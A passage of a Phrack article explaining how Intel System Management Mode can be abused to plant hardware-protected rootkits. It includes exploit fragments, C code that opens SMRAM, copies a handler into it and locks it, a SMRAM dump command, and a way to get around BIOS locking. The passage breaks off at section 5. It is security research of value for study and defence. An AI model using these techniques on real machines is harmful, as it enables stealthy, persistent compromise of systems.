@@ -1,0 +1,1309 @@
+                             ==Phrack Inc.==
+
+               Volume 0x0c, Issue 0x41, Phile #0x07 of 0x0f
+
+
+|=-----------------------------------------------------------------------=|
+|=-----------------=[ System Management Mode Hack    ]=------------------=|
+|=-----------------=[ Using SMM for "Other Purposes" ]=------------------=|
+|=-----------------------------------------------------------------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[ By BSDaemon                          ]=--------------=|
+|=---------------=[ <bsdaemon *noSPAM* risesecurity_org> ]=--------------=|
+|=---------------=[                                      ]=--------------=|
+|=---------------=[    coideloko                         ]=--------------=|
+|=---------------=[ <cdlk     *noSPAM* kernelhacking_com>]=--------------=|
+|=---------------=[                                      ]=--------------=|
+|=---------------=[    D0nAnd0n                          ]=--------------=|
+|=---------------=[ <d0nand0n *noSPAM* kernelhacking.com>]=--------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ March 29 2008 ]=--------------------------=|
+|=-----------------------------------------------------------------------=|
+
+					"Very nice! How much?"
+						- Borat Sagdyiev
+
+------[  Index
+
+  1 - Introduction
+    1.1 - Paper structure
+
+  2 - System Management Mode
+    2.1 - Pentium modes of operation
+    2.2 - SMM Overview
+	2.2.1 - SMRAM
+	2.2.2 - SMI Handler
+	2.2.3 - SMI Triggering
+	2.2.4 - Duflot discovery - Exploit
+    2.3 - Duflot misses
+    	2.3.1 - PCI Configuration
+	2.3.2 - Why and when the system generates a SMI
+    2.4 - SMM Internals - Our first experiences
+	2.4.1 - Analysing the SMM registers
+	2.4.2 - SMM Details
+
+  3 - SMM for evil purposes
+    3.1 - Challenges
+        3.1.1 - Cache-originated overwrites
+        3.1.2 - SMM Locking
+        3.1.3 - Portability
+	3.1.4 - Address translation 
+    3.2 - Copying our code in the SMM space
+	3.2.1 - Testing
+	3.2.2 - Descriptor caches
+        3.2.3 - Code relocation
+
+  4 - SMM Manipulation Library
+
+  5 - Future and other uses
+
+  6 - Acknowledgements
+
+  7 - References
+
+  8 - Sources - Implementation details
+
+
+------[ 1 - Introduction
+
+This article will try to explain some details about the Intel Architecture
+[1] and how it can be manipulated by a malicious user to create a complete
+hardware-protected malware.
+
+Also, since the main focus of the article are the System Management Mode 
+[1] features, we will go into details of the Duflot [2] study and beyond,
+showing how to create a stable system running inside the SMM [3].
+
+It's important to mention that everything showed here is really
+processor-bridges-dependent (we are focusing on Intel processors [1]).
+
+Since inside the SMM a malware could manipulate the whole system memory, it
+can be used to modify kernel structures and create a powerful rootkit.
+
+
+---[ 1.1 - Paper structure
+
+The idea of this paper is to complete the studies about SMM, explaning how 
+to use it for evil purposes.
+
+For that, the paper have been structured in two important portions:
+	
+Chapter 2 will give a basic knowledge of the Pentium modes of operation
+(needed to better understand the other portions of the chapter) and them 
+will introduce what was the Duflot discoveries related to that.  After that
+the chapter will explain what Duflot missed, explaining why the system
+behaves in the way that permits our uses, and introducing the SMM internals
+and our library to manipulate the SMM.
+Chapter 3 will explain how to use the SMM for evil purposes, explaning
+the challenges to use the SMM and giving pratical samples on the use of our
+library.
+
+
+------[ 2 - System Management Mode
+
+From the Intel manuals [1]:
+	"The Intel System Management Mode (SMM) is typically used to execute
+specific routines for power management. After entering SMM, various parts 
+of a system can be shut down or disabled to minimize power consumption. SMM
+operates independently of other system software, and can be used for other
+purposes too."
+
+Everytime we read something like "and can be used for other purposes" we
+start to think: what the hell?  What kind of other purposes?
+
+It's interesting that every single sample in the Internet just points to
+energy-related uses of the SMM, and says nothing about other purposes.
+
+In 2006, Duflot and others [2] released a paper about how to use the SMM to
+circumvent operating system protections.  It was the first time that a
+misuse of the SMM was shown, and it gave some ideas (like how to put a code
+in SMM,  how to manipulate the system memory inside SMM and how to force a
+system to enter the SMM), leaving open many questions that will be answered
+here (how to create a really stable code to subvert the SMM, how to
+manipulate the SMM registers, difficulties in create a stable system
+running inside the SMM and why the system behaves in the way he just said
+in the paper).
+
+
+---[ 2.1 - Pentium modes of operation
+
+Everybody already knows about the modes of operation of the P6 family of
+processors.
+
+Real-mode is a 16-bit addressing mode, keept for legacy purposes and 
+nowadays just used in the boot process.  Protected mode is a 32-bit mode 
+and provides the protection model used by the modern operation systems.
+
+The Virtual 8086 mode have been introduced to garantee greater efficiency 
+when running programs created for older architectures (such as 8086 and 
+8088).
+
+The System Management Mode (SMM) is another mode of operation that, as 
+already said, is supposed to be used to manage power functions.
+
+Volume 3 of the Intel processor manuals [1] already explained the 
+acceptable transitions between those modes:
+
+         -------------------                    SMI (interrupt)
+      |->|Real Address Mode| -------------------------------------------|
+      |  ------------------- <----------------------------------|       |
+      |  | PE=1    ^ PE=0 (requires ring0) or                   |rsm or |
+      |  v         | reset                                      |reset  V
+      |  -------------------                                    ---------
+reset |  | Protected Mode  | -------> SMI (interrupt) ------> | SMM Mode |
+      |  ------------------- <------- rsm instruction <------   ---------
+      |  | VM=1    ^ VM=0                                       |       ^
+      |  v         |                                            |rsm    |
+      |  ------------------- <----------------------------------|       |
+      |- |Virtual 8086 Mode| -------------------------------------------|
+         -------------------                    SMI (interrupt)
+
+
+P.S.: PE and VM are flags of the CR0 (control register 0)
+
+Basically what we need to get from here is:
+	- Any mode of operation in the intel platform can make a transition to
+        the SMM mode if an SMI interrupt is issued.
+	- SMM mode will return to the previous mode by issuing a rsm
+	instruction (so the processor will read a saved-state to restore the
+	system to the previous situation before enter the SMM).
+
+---[ 2.2 - SMM Overview
+
+First of all, when the system enters the SMM mode, the whole processor 
+context must be saved in a way so that it can be restored later. By doing 
+so, the processor can enter in a special execution context and start 
+executing the SMI handler.  To return from this mode there is the special
+instruction RSM (can be used just inside the SMM itself) that will read the
+saved context and return to the previous situation).
+
+Also, in SMM the paging is disabled and you have a 16-bit mode of operation
+, but all physical memory can be addressed (more on this later).
+
+There are no restrictions to the I/O ports or memory, so we have the same
+privileges as in Ring 0 (in fact, from SMM someone can just manipulate all
+the system memory).
+
+What Duflot showed is a way to put your own SMI handler, force the 
+processor to enter the SMM mode, change the system memory to bypass a 
+security protection (in his case, the securelevel of an OpenBSD system) and
+then execute his own code changing the saved context to point to it.
+
+---[ 2.2.1 - SMRAM
+
+The System Management Mode has a dedicated memory zone called SMRAM.  It's
+located in the 0x1FFFF bytes starting at SMBASE (it may be bigger if the 
+system activates Extented SMRAM).
+
+The default value of SMBASE is 0x30000, but since modern chipsets offer
+relocation, it's commonly seen as 0xA0000 (BIOS relocates it to the same
+memory-mapped base address used by the I/O ports of the video card).
+
+As spotted by Duflot, the memory controller hub has a control register 
+called SMRAM Control Register that offers a bit (D_OPEN - bit 6) that, when
+it's set, makes all memory accesses to the address space starting at SMBASE
+be redirected to SMRAM.
+
+If the processor is not in the SMM mode and the D_OPEN bit is not set, all 
+accesses to the SMRAM memory range are forwarded to the video card (when it
+have been relocated to the shared address as said) - giving a protection to
+the SMRAM, which we will use later to protect the malware).  Else, if the 
+D_OPEN bit is set, the memory addressed will be the SMRAM.  
+
+Another important thing he showed concerning the handler is the bit number 
+4 (D_LCK) of the SMRAM Control Register, which, when set, protects the 
+SMRAM control register and thus, the SMRAM memory itself, if the D_OPEN bit
+was not set at the time the control register was locked. To change it, the
+system needs to reboot (which gives us a challenge, since most modern BIOS
+will lock it).
+
+It's well detailed in the Intel Manuals, but the fact that a super-user
+could write to it using the video device and then force a SMI to be 
+triggered was really new.
+
+When entering the SMM the processor will jump to the pysical address
+SMBASE+0x8000 (which means that the SMI handler must be located at the 
+offset 0x8000 inside the SMRAM). Since when the D_OPEN bit is set we can 
+put some code in the SMRAM, we just need to force an SMI trigger to get 
+our code executed.
+
+                 -----------------
+SMBASE+0x1FFFF  |                 |
+                |                 |
+                |                 |
+                |                 |
+SMBASE+0xFFFF    -----------------
+                |                 |
+                | State save area |
+                |                 |
+SMBASE+0xFE00    -----------------
+                |                 |
+                | Code,Heap,Stack |
+                |                 |
+SMBASE+0x8000    ----------------- ----> First SMI Handler instruction
+                |                 |
+                |                 |
+                |                 |
+SMBASE=0xA0000   -----------------
+
+
+---[ 2.2.2 - SMI handler
+
+Since we will set the D_OPEN bit we need some way to avoid the display 
+usage, since all access to the video memory will be forwarded to SMRAM and 
+not to the video card. Duflot does not explain how it is possible, since 
+his sample was for OpenBSD and it assumed there was no one using the video
+card (he showed an exploit for an OpenBSD problem but as a requisite, 
+there is no one using the X, for example).
+
+In our samples, we will also show how to manipulate the registers directly,
+but we will use the libpci [4] to guarantee no problems with this (since 
+the libpci uses the system interfaces to manipulate the PCI subsystem 
+avoiding race conditions in the resource usage).  It's also more portable,
+because libpci as we will show supports a lot of different operating 
+systems.
+
+So, to insert the handler the attacker needs to:
+	- Verify if the D_LCK bit is not set
+	- Set the D_OPEN bit
+	- Have access to the memory address space (in the sample,
+          0xA0000-0xBFFFF)
+
+To access the memory we can just mmap the memory range using the /dev/mem 
+device, because it provides access to the physical address space 
+(instead of the virtual vision provided by the /dev/kmem for example).
+
+---[ 2.2.3 - SMI Triggering
+
+Since the SMI signal is a hardware-generated interrupt there is no 
+instruction to generate it by software. The chipset may generate it, but 
+_when_ it does depends on the chipset [5][6].
+
+Duflot also already explained in his paper the SMI_EN register, where the 
+least significant bit is a global enable, specifying whether SMIs are 
+enabled or not (the other bits of SMI_EN then control which devices can 
+generate an SMI).
+
+The SMI_STS register keeps track of which device last caused an SMI.
+
+These registers can be accessed using the regular PCI mechanisms ("in" and
+"out"). The position of those register are variable, but they are in a
+relative address to PMBASE (SMI_EN=PMBASE+0x30 and SMI_STS=PMBASE+0x34).
+
+The PMBASE can be accessed using bus 0, device 0x1F, function 0 and offset 
+0x40.
+
+More details of the PCI configuration mechanisms in the section 2.3.1.
+
+
+---[ 2.2.4 - Duflot discovery - Exploit
+
+In his paper Duflot & friends showed a working exploit against OpenBSD.  
+This will be our first code to be analyzed (also attached with small 
+modifications to work on Linux).
+
+As can be seen, the code will have problems if there is an X Server running
+,since it just forwards all video memory access to the SMRAM.
+
+Since the Linux operating system (as most of unixes) provides a way to rise
+the I/O privilege level in the user-mode, the exploit is using that in a 
+way it can use the instructions in/out:
+
+        if(iopl(3) < 0) {
+
+To get access to the SMRAM, the D_OPEN bit must be set:
+	outl(data1, 0xcf8);
+        outl(data2, 0xcfc);
+
+Also here, we can easily see that, in the handler, it is doing the 
+following:
+
+        addr32 mov $test, %eax
+	mov %eax, %cs:0xfff0
+
+Here we have that the offset 0xfff0 is the saved EIP in the saved-state map
+inside the SMRAM. By doing so, it is just putting the address of a function
+in the saved-state map, so when the system triggers the rsm instruction 
+it will return to protected mode, but now executing the test() function 
+(the saved EIP).
+
+Duflot discovered that accessing the Programmed I/O Port 0xB2 with the bit 
+5 of SMI_EN set will generate an SMI:
+
+        outl(0x0000000f, 0xb2);
+
+For sure it's really funny... but what else can be done with that?
+
+
+---[ 2.3 - Duflot misses
+
+In his paper Duflot does not explain how the PCI Configuration really works
+(for example, he just pointed to use the port 0xCF8 for address and port 
+0xCFC to perform the operation itself). Also, he never said when and why 
+the system generates a SMI.  The idea of use the SMM to manipulate the 
+system memory can also be really expanded, to create a malware running 
+inside the SMM, or to bypass boot-protections and many others (like create 
+a system protection mechanism running on it).
+
+The rest of this chapter and the next one will show many details about how
+the SMM works and what we can use inside the SMM.  Also, will better
+explain how to analyse the system and create a portable library to 
+manipulate the SMM-related registers.
+
+
+---[ 2.3.1 - PCI Configuration
+
+The original PCI specification [11] defined two mechanisms for i386 PCs, 
+but later specifications deprecated one of these ways. Since this 
+specification is not free, we highly recommend you to read a book about 
+that [12].
+
+Basically, you have two I/O port ranges: one associated to the address port
+(0xCF8-0xCFB) and the other to the data port (0xCFC-0xCFF).
+
+To configure a device, you must write to the address port which device and
+register you want to access and then read/write the data from/to the data
+port.
+
+The rule about the format of the data written to the address port is as 
+following:
+
+Bits    Description
+0..1    00b (always 0)
+2..7    Which 32-bit space in the config space to access
+8..10   Device function
+11..15  Device Number
+
+A complete list of PCI vendors and devices can be found in [13].
+
+PCI devices have an address which is broken down into a PCI-bus number, a
+device number within that bus (values 0-31), and a function number within
+the device (values 0-7).
+
+Since a single sample is more valuable, to access a register REG in the 
+bus:device:function PCI space you will need to use the following address:
+	0x80000000L | ((bus & 0xFF) << 16) |
+		((((unsigned)device) & 0x1F) << 11) |
+		((((unsigned)func) & 0x07) << 8) | (REG & 0xFC);
+
+In each PCI device's configuration space there's normally one or more
+BARs (Base Address Registers), which can be used to set or find the address
+in physical memory or in I/O space of each resource the card uses.
+
+---[ 2.3.2 - When and why the system generates a SMI
+
+All memory transactions (read/write memory access) from the CPU are placed 
+on the host bus to be consumed by some device.
+
+Potentially the CPU itself would decode a range (of memory) such as the 
+Local APIC range, and the transaction would be satisfied before needing 
+to be placed on the external bus at all.
+
+If the CPU does not claim the transaction (don't decode), then it must be
+sent out.  In a typical Intel architecture, the transaction would next be 
+decoded by the MCH (Memory Controller Hub) and be either claimed as an 
+address that the MCH owns, or it's determining based on decoders that the 
+transaction is not owned by the MCH and thus should be forwarded on to the 
+next possible device in the chain.
+
+If the memory controller does not find the address to be within actual 
+DRAM, then it looks to see if it falls within one of the other I/O ranges 
+it owns (ISA, EISA, PCI).
+
+Depending on how old the system is, the memory controller may directly 
+decode PCI transactions (instead of pass that to the I/O bridges), for 
+example.
+
+If the MCH determines that the transaction does not belong to it, the
+transaction will be forwarded down to whatever I/O bridge(s) may be present
+in the system.  This process of decoding for ownership / response or 
+forwarding down if not owned repeats until the system runs out of potential
+agents.
+
+The final outcome is either an agent claims the transaction and returns
+whatever data is present at the address, or no one claims the address and
+an abort occurs to the transaction, typically resulting in 0FFFFFFFFh data
+being returned.
+
+In some situations (Duflot paper's case), some addresses (for example those
+falling within the 0A0000h - 0BFFFFh range) are owned by two different 
+devices (VGA frame buffer and system memory).  This will force the 
+architecture to send a SMI signal to satisfy the transaction.
+
+If no SMI is asserted, then the transaction is ultimately passed over by
+the memory controller, so that the VGA controller (if present) can claim 
+it.
+
+If the SMI signal is asserted when the transaction is received by the 
+memory controller, then the transaction will be forwarded to the DRAM 
+unit for fetching the data from physical memory (executing our handler).
+
+---[ 2.4 - SMM Internals - Our first experiences
+
+Here we will clarify some important details about SMM and how it works. 
+This will be important to better understand the attached library.
+
+---[ 2.4.1 - Analyzing the SMM registers
+
+Let's start by analyzing the SMM using libpci, so we can have more 
+stability doing this.
+
+The following code is known to work fine in ICH5 and ICH3M controllers.  
+
+---   code   ---
+
+#include <stdio.h>
+#include <pci/pci.h>
+#include <sys/io.h>
+
+/* Defines - bit positions (will be used in more samples) */
+#define D_OPEN_BIT      (0x01 << 6)
+#define D_CLS_BIT       (0x01 << 5)
+#define D_LCK_BIT       (0x01 << 4)
+#define G_SMRAME_BIT    (0x01 << 3)
+#define C_BASE_SEG2_BIT (0x01 << 2)
+#define C_BASE_SEG1_BIT (0x01 << 1)
+#define C_BASE_SEG0_BIT (0x01)
+
+/* Function to print SMRAM registers */
+void show_smram(struct pci_dev* SMRAM)
+{
+	u8 smram_value;
+
+	/* Provided by libpci */
+        smram_value = pci_read_byte(SMRAM, SMRAM_OFFSET);
+
+	if(smram_value & D_OPEN_BIT) {
+                printf("D_OPEN_BIT:      1\n");
+        } else {
+                printf("D_OPEN_BIT:      0\n");
+        }
+        if(smram_value & D_CLS_BIT) {
+                printf("D_CLS_BIT:       1\n");
+        } else {
+                printf("D_CLS_BIT:       0\n");
+        }
+        if(smram_value & D_LCK_BIT) {
+                printf("D_LCK_BIT:       1\n");
+        } else {
+                printf("D_LCK_BIT:       0\n");
+        }
+        if(smram_value & G_SMRAME_BIT) {
+                printf("G_SMRAME_BIT:    1\n");
+        } else {
+                printf("G_SMRAME_BIT:    0\n");
+        }
+        if(smram_value & C_BASE_SEG2_BIT) {
+                printf("C_BASE_SEG2_BIT: 1\n");
+        } else {
+                printf("C_BASE_SEG2_BIT: 0\n");
+	}
+        if(smram_value & C_BASE_SEG1_BIT) {
+                printf("C_BASE_SEG1_BIT: 1\n");
+        } else {
+                printf("C_BASE_SEG1_BIT: 0\n");
+        }
+        if(smram_value & C_BASE_SEG0_BIT) {
+                printf("C_BASE_SEG0_BIT: 1\n");
+        } else {
+                printf("C_BASE_SEG0_BIT: 0\n");
+        }
+        printf("\n");
+}
+
+int main(void) {
+        struct pci_access *pacc;
+        struct pci_dev *SMRAM;
+
+	/* Provided by libpci */
+        pacc = pci_alloc();
+        pci_init(pacc);
+
+        SMRAM = pci_get_dev(pacc, 0, 0, 0, 0);
+
+        printf("Current status of SMRAM:\n");
+        show_smram(SMRAM);
+
+        printf("Setting D_OPEN to 1\n");
+        pci_write_byte(SMRAM, SMRAM_OFFSET, 0x4a);
+        show_smram(SMRAM);
+
+        printf("Locking SMRAM\n");
+        pci_write_byte(SMRAM, SMRAM_OFFSET, 0x1a);
+        show_smram(SMRAM);
+
+        printf("Trying to set D_OPEN to 0\n");
+        pci_write_byte(SMRAM, SMRAM_OFFSET, 0x0a);
+        show_smram(SMRAM);
+
+        return 0;
+}
+
+--- end code ---
+
+Compile this using:
+	gcc -o brazil_smm1 brazil_smm1.c -lpci -lz
+
+An execution sample:
+
+rrbranco:~/Phrack# ./brazil_smm1
+Current status of SMRAM:
+D_OPEN_BIT:      0
+D_CLS_BIT:       0
+D_LCK_BIT:       0
+G_SMRAME_BIT:    0
+C_BASE_SEG2_BIT: 0
+C_BASE_SEG1_BIT: 0
+C_BASE_SEG0_BIT: 0
+
+Setting D_OPEN to 1
+D_OPEN_BIT:      1
+D_CLS_BIT:       0
+D_LCK_BIT:       0
+G_SMRAME_BIT:    0
+C_BASE_SEG2_BIT: 0
+C_BASE_SEG1_BIT: 0
+C_BASE_SEG0_BIT: 0
+
+Locking SMRAM
+D_OPEN_BIT:      1
+D_CLS_BIT:       0
+D_LCK_BIT:       1
+G_SMRAME_BIT:    0
+C_BASE_SEG2_BIT: 0
+C_BASE_SEG1_BIT: 0
+C_BASE_SEG0_BIT: 0
+
+Trying to set D_OPEN to 0
+D_OPEN_BIT:      1
+D_CLS_BIT:       0
+D_LCK_BIT:       1
+G_SMRAME_BIT:    0
+C_BASE_SEG2_BIT: 0
+C_BASE_SEG1_BIT: 0
+C_BASE_SEG0_BIT: 0
+
+
+---[ 2.4.2 - SMM Details
+
+When the processor enters the SMM mode it will signal an output pin, 
+aSMIACT#, to notify the chipset that the processor is in the SMM.
+
+The SMI interrupt itself can be triggered anytime, except while the 
+processor is already in SMM (of course). This will cause the SMM handler to
+be executed (as we already showed).
+
+Since the SMIACT# was noticed by the chipset, all further memory accesses 
+will be redirected to the SMRAM protected memory. After that, the processor
+will start to save its internal state in the saved_state map area, inside
+the SMRAM. Then, the handler starts to execute.
+
+What is the current state? The processor is in a 'real mode', with all 
+segments containing 4GB limit and being readable/writable.
+
+As said, to leave the SMM, the RSM instruction is issued by the handler, 
+and  then the processor reads the saved-state map again, performing just 
+some checks on it (that's good) restoring the system to the previouas 
+situation.
+
+SMM writes data in the saved-state map exactly in the same way as the stack
+does, from top to bottom beginning from the SMBASE register (thus, 
+permiting relocation). It's important to keep this in mind when 
+manipulating the saved-state map.
+
+If the system enters SMM by result of a halt or I/O instruction, the 
+handler can tell the system to continue the execution after that or to 
+enter the halt state just setting a flag in the saved-state map.
+
+Upon entrance in SMM the interrupts are disabled (including the 
+asyncronous NMI (Non Maskable Interrupt) and INIT), and the IDT (interrupt
+description table)  register keeps it's value. In order to service 
+interrupts inside SMM (a motivation for that will be showed),  one needs to
+setup an own interrupt vector [14] and reload the IDT with your new value,
+since the values contained in the old IDT are no longer valid in the 
+address space used by SMM.
+
+After the STI instruction, the system start to receive some interrupts 
+but will  still miss the asyncronous ones. To enable that is needed to
+issue the IRET/IRETD instructions.
+
+The big concern about re-enabling interrupts inside the SMM handler is that
+if an NMI interrupt is received while inside the handler, it will be 
+latched. So, potentially any verification done inside the SMM handler can 
+be bypassed if someone hooked the NMI handler routine (this routine would
+be executed  immediately after the RSM, before the processor starts 
+executing the code pointed by the EIP in the saved-state map).
+
+During our tests, SMM relocation gave us some problems in older machines 
+(pentium II/III).  Also, we preferred to use those machines to test our 
+things, since there is no SMM locking being done by the BIOS (generally 
+saying, BIOS older than 2 years).
+
+Apparently, those older processors had a fixed CS value point to 0x30000 
+(the default SMM position - relocated by most of modern BIOS to 0xA0000 as 
+we already said).
+
+If we enable interrupts inside the SMM, when an interrupt is invoked, it 
+will save CS:IP in the stack for further return. But it will use the fixed 
+value of CS (0x30000) instead of using the SMBASE value, not reflecting 
+the  right code segment that the SMM is actually using and, therefore, the 
+code will return to the wrong location.
+
+Also, the Intel documentation mentions alignment problems in the SMBASE 
+value in older processors (previously to PIV).
+
+------[ 3 - SMM for evil purposes
+
+As already said, the SMM can be used to modify kernel internal structures.
+
+Here we will also show some challenges and other possible uses for a 
+malware code running inside the SMM.
+
+---[ 3.1 - Challenges
+
+---[ 3.1.1 - Cache-originated overwrites
+
+When entering the SMM, the SMRAM may be overwritten by data in the cache 
+if a #FLUSH occur after the SMM entrance.
+
+To avoid that we can shadow SMRAM over non-cacheable memory or assert 
+#FLUSH simultaneously to #SMI events (#FLUSH will be served first). 
+Most BIOS mark the SMRAM range as non-cacheable for us (and also locks it, 
+since Duflot paper publication).
+
+---[ 3.1.2 - SMM Locking
+
+Most BIOS manufacturers lock the SMM nowadays. When you are inserting a
+protecting mechanism using the SMM you can just replace the system BIOS 
+for an open-source one (see LinuxBIOS [7]).
+
+When we are talking about malicious code, this cannot be done and some 
+kind of BIOS patching must take place.
+
+This article is focusing in the SMM manipulation itself, but a good 
+approach to bypass the BIOS protection is to use the TOP_SWAP [8] bit to 
+execute our code before the original BIOS code and then load our SMM 
+handler and lock it (this will prevent the original BIOS to overwrite our 
+SMM handler).
+
+Basicaly this bit is used to define if the system will use the first 64K 
+or the second one as area to load the BIOS from.  Knowing that, someone 
+can just set the TOP_SWAP bit, put own code in the second 64K area and in 
+the code jump back to the original BIOS code.  This code will be runned 
+BEFORE the BIOS.
+
+The TOP_SWAP bit exists to provide a secure way to BIOS update - the BIOS 
+code is copied to the second 64K, the TOP_SWAP bit is set, the update is 
+done and an integrity check is performed - if there is anything that makes
+the system to reboot, it will restart in the second 64K which holds a copy
+of the original BIOS without any problems.
+
+---[ 3.1.3 - Portability
+
+As said, the SMM is harware-dependent, more specifically it's 
+ICH-dependent.
+
+The attached code is know to work in ICH5 and ICH3M, tested under Linux, 
+but since it uses the libpci, it's supposed to work also in FreeBSD, 
+NetBSD, OpenBSD (also tested on it), Solaris, Aix, GNU/Hurd and Windows).
+
+To provide support to other ICHs one must edit the libSMM.h header file to 
+specify the correct location of the bus, device, function and offset and 
+then be sure the PMBASE returned by the function get_pmbase() is right 
+(comparing to the manuals).
+
+After that, verify if the SMRAM_OFFSET is correctly defined (you can get 
+that in your I8xx manuals).  If so, the bits in the SMRAM control register 
+will be correctly showed (you can easily test it using the D_LCK bit, since
+when set will not permit any other bit to be manipulated).  One can also
+test it using the dd command showed next in this article and the D_OPEN bit
+(use the open_smram function, write to the SMRAM memory mmap'ing it and 
+then dump it to verify if it's working).
+
+---[ 3.1.4 - Address translation
+
+Address translation is a great difficulty when we are inside our handler, 
+since we need the value of the CR3 register (which we can get from the 
+saved-state map) to manually parse the page tables and then perform the 
+actual translation.
+
+Another approach is to just transfer the control back to our code in the 
+same way that Duflot did, but we need to save the current processor 
+status inside SMM, so after the execution of our code (after the SMM) we 
+can transfer the control back to the process that was executing before 
+triggering the SMI (else we would have some portions of the system just 
+stopping to work after our malware get executed).
+
+This is not good... 
+
+The best thing that we can do is just have a simple handler that gives the
+biggest privilege level of execution to the calling code (i.e. the code 
+that was executing before the SMI) and then return. By doing so, we avoid 
+to stay too much time in the SMM context and don't need to care about 
+stopped OS processes.
+
+In the next sections we clarify how to put code in the SMM space, test it 
+and then an approach using the descriptor caches to provide the above 
+statement.
+
+
+---[ 3.2 - Copying our code in the SMM space
+
+---[ 3.2.1 - Testing
+
+So, the first step to put some code in the SMM is to open the SMRAM by 
+setting the D_OPEN bit.
+
+---   code   ---
+pci_write_byte(smram_dev, SMRAM_OFFSET, (current_value | D_OPEN_BIT));
+--- end code ---
+
+To close it after we finish, we will use the following:
+
+---   code   ---
+pci_write_byte(smram_dev, SMRAM_OFFSET, (current_value & ~D_OPEN_BIT));
+--- end code ---
+
+Also, after inserting our code, we want to lock SMRAM access, avoiding 
+anyone from changing the SMM-related registers.
+
+---   code   ---
+pci_write_byte(smram_dev, SMRAM_OFFSET, (current_value | D_LCK_BIT));
+--- end code ---
+
+In order to get our code inserted in the SMRAM memory, we need to map it, 
+in the same way we did in the exploit.
+
+---   code   ---
+fd = open(MEMDEV, O_RDWR);
+
+if(fd < 0) {
+	fprintf(stderr, "Opening %s failed, errno: %d\n", MEMDEV, errno);
+	return -1;
+}
+
+vidmem = mmap(NULL, MAPPEDAREASIZE, PROT_READ | PROT_WRITE, MAP_SHARED,
+		fd, SMIINSTADDRESS);
+
+if(vidmem == MAP_FAILED) {
+	fprintf(stderr, "Could not map memory area, errno: %d\n", errno);
+	return -1;
+}
+close(fd);
+
+/* Here we are copying our code to the SMRAM memory */
+if(vidmem != memcpy(vidmem, handler, endhandler-handler)) {
+	fprintf(stderr, "Could not copy asm to memory...\n");
+	return -1;
+}
+
+if(munmap(vidmem, MAPPEDAREASIZE) < 0) {
+	fprintf(stderr, "Could not release mapped area, errno: %d\n", errno);
+	return -1;
+}
+--- end code ---
+
+It's a good idea to verify if it's working properly, and also make a 
+previous copy of your SMRAM memory contents before that.
+
+So, let's do that using dd:
+	dd if=/dev/mem of=my_smram bs=1 skip=`expr 655360 - 1` count=64K
+
+P.S.:  655360 is 0xa0000 in decimal (as spotted by Duflot, SMM is commonly
+relocated to that address instead 0x30000, as in the default case)
+
+---[ 3.2.2 - Descriptor caches
+
+This idea worked in some system and not in some others, since the Intel
+documentation is not exactly clever about this subject.
+
+From the Intel manual: "Every segment register has a visible part and a 
+hidden part (The hidden part is sometimes referred to as a descriptor 
+cache or a shadow register).  When a segment selector is loaded into the 
+visible part of a segment register, the processor also loads the hidden 
+part of the segment register with the base address, segment limit, and 
+access control information from the segment descriptor pointed to by the 
+segment selector."
+
+"Access control information" is refering to the well know xPL:
+	- RPL -> Request privilege level
+	- CPL -> Current privilege level
+	- DPL -> Descriptor privilege level
+
+In the saved-state map inside the SMRAM, also according to the Intel 
+manuals, are saved the descriptor caches and the CR4 register (the manual 
+says it's not readable and write to this values will cause an 
+"unpredictable behavior").
+
+We found the following:
+
+TSS Descriptor Cache (12-bytes) - Offset: FFA7
+IDT Descriptor Cache (12-bytes) - Offset: FF9B
+GDT Descriptor Cache (12-bytes) - Offset: FF8F
+LDT Descriptor Cache (12-bytes) - Offset: FF83
+GS  Descriptor Cache (12-bytes) - Offset: FF77
+FS  Descriptor Cache (12-bytes) - Offset: FF6B
+DS  Descriptor Cache (12-bytes) - Offset: FF5F
+SS  Descriptor Cache (12-bytes) - Offset: FF53
+CS  Descriptor Cache (12-bytes) - Offset: FF47
+ES  Descriptor Cache (12-bytes) - Offset: FF3B
+
+The saved-state map is stored at SMBASE + 0xFE00 to SMBASE + 0xFFFF.
+
+Modifying the DPL field of the SS descriptor cache from 3 to 0 gives ring0
+power to our program (and a General Protection Fault in newer processors).
+
+---[ 3.2.3 - Code relocation
+
+SMM has the ability to relocate its protected memory space. The SMBASE 
+value saved in the state save map may be modified. This value is read 
+during the RSM instruction. When SMM is next entered, the SMRAM will be
+located at this new address.
+
+From our SMM handler, in the saved-state map, we can modify this value (at
+offset 0xFEF8 from SMBASE). To perform that, we must care about CS 
+adjustments inside our code.
+
+It can be used to relocate the SMRAM to memory area of our choosing and 
+trick those who try to dump the SMRAM for analysis using the standard 
+SMBASE values (anyway, since our malware is locking the SMM and clearing 
+the D_OPEN bit, we don't need to use this technique).
+
+
+------[ 4 - SMM Manipulation Library
+
+The SMM Manipulation Library attached in this article provides an easy 
+way to create portable code to manipulate the SMRAM control register.
+
+It offers the following methods:
+	u8 show_smram  (struct pci_dev* smram_dev, u8 bits_to_show)
+		It's used to test if specific bits are set or not
+		The pci_dev structure are optional, NULL can be passed.
+
+	u16 get_pmbase (void)
+		Internally used by the library to manipulate the SMI-enablement.
+		Exported by the function to turn easy to an external program
+		verify the correct offsets for the SMI_EN and SMI_STS.
+
+	u16 get_smi_en_iop (void)
+		Return the location of the SMI_EN
+
+	u16 get_smi_sts_iop (void)
+		Return the location of the SMI_STS
+
+	int enable_smi_gbl (u16 smi_en_iop)
+		Enable SMI globally
+
+	int disable_smi_gbl (u16 smi_en_iop)
+		Disable SMI globally
+
+	int enable_smi_on_apm (u16 smi_en_iop)
+		Enable SMI on APM events
+
+	int disable_smi_on_apm (u16 smi_en_iop)
+		Disable SMI on APM events
+
+	int open_smram(void)	
+		Open SMRAM for access (set D_OPEN bit)
+
+	int close_smram(void)
+		Close SMRAM for access (unset D_OPEN bit)
+
+	int lock_smram(void)
+		Lock the SMRAM (set D_LCK bit)
+
+	void write_to_apm_cnt(void)
+		Write to the APM CNT (generate a SMI)
+
+Also, the include file libSMM.h contains the valid values to be used to 
+locate related registers and bit's for the SMM manipulation, like the 
+device, function bus and offsets.  It contains specify defines for 
+interesting bits inside the SMRAM control register too, like the D_OPEN 
+and the D_LCK.
+	
+Attached to the article is also the file libSMM_test.c showing how to use 
+the SMM Manipulation Library.  This program will basically set and unset 
+all control registers that will affect the SMM manipulation.  It can be 
+used to test if the library is working propertly in your hardware and 
+since it will also test the D_LCK bit, one need to reboot after run this 
+program.
+
+The evil.c code also attached will use the SMM Manipulation Library to 
+insert a small SMM handler that freezes the processor.
+
+------[ 5 - Future and other uses
+
+We can't foresee the future, but modern rootkits are becoming much more
+targeted, so this kind of deeper hackishs will start to be more widely 
+seen.
+
